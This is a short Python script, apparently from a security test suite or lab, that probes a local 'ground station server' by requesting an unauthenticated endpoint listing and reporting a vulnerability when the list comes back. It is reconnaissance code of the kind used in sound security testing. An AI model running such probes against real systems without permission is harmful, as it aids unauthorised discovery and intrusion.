#!/usr/bin/env python3
"""Attack 1: API Enumeration.

Verifies unauthenticated endpoint discovery on the ground station server.
"""

import requests

BASE_URL = "http://localhost:5000"


def test_attack_1():
    print("[+] Running Individual Attack 1: API Enumeration...")
    url = f"{BASE_URL}/api/endpoints"
    try:
        response = requests.get(url, timeout=5)
        print(f"[*] GET {url} - Status Code: {response.status_code}")
        if response.status_code == 200:
            endpoints = response.json()
            print("[✓] Vulnerability confirmed! Discovered endpoints:")
            for ep in endpoints:
                print(f"    - {ep}")
        else:
            print(f"[!] Unexpected response: {response.text}")
    except Exception as e:
        print(f"[X] Connection error: {e}")


if __name__ == "__main__":
    test_attack_1()
